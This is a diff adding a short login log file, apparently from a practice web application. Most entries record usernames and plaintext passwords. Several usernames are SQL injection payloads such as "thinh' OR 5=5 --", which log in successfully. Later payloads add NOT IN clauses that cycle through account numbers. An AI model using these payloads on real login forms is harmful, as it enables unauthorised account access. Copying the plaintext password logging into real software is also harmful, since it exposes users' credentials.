@@ -1,0 +1,11 @@
+[Login Failed] Username: admin || Password: admin, Time: 2024-03-24 11:06:28
+[Login Failed] Username: admin || Password: admin123, Time: 2024-03-24 11:06:51
+[Login Failed] Username: user || Password: pass, Time: 2024-03-24 11:07:01
+[Successful login] Username: guest || Password: guest, Time: 2024-03-24 11:07:11
+[Login Failed] Username: thinh"-- || Password: 123, Time: 2024-03-24 11:08:20
+[Login Failed] Username: thinh'-- || Password: 123, Time: 2024-03-24 11:08:29
+[Successful login] Username: thinh' OR 5=5 -- || Password: password, Time: 2024-03-24 11:08:52
+[Successful login] Username: thinh' OR 5=5 AND account_number NOT IN (1002)-- || Password: password, Time: 2024-03-24 11:12:47
+[Successful login] Username: thinh' OR 5=5 AND account_number NOT IN (1002, 1521)-- || Password: 123, Time: 2024-03-24 11:13:12
+[Successful login] Username: thinh' OR 5=5 AND account_number NOT IN (1002, 1521, 2527)-- || Password: 123, Time: 2024-03-24 11:13:37
+[Successful login] Username: thinh' OR 5=5 AND account_number NOT IN (1002, 1521, 2527, 3089)-- || Password: 123, Time: 2024-03-24 11:13:52
